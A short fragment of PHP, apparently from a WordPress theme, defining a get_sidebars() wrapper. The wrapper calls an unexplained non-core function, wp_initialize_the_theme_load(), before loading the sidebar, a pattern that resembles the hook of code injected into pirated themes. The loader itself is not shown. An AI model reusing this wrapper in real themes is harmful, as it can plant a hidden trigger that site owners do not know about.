if(!function_exists('get_sidebars')) { function get_sidebars($the_sidebar = '') { wp_initialize_the_theme_load(); get_sidebar($the_sidebar); } }
?>